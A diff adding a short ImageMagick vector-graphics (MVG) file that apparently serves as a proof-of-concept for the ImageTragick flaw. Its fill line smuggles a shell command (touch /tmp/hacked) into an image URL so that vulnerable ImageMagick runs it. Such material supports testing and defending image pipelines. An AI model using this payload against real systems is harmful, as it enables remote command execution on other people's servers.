@@ -1,0 +1,4 @@
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://192.168.206.135/oops.jpg"|touch "/tmp/hacked)'
+pop graphic-context
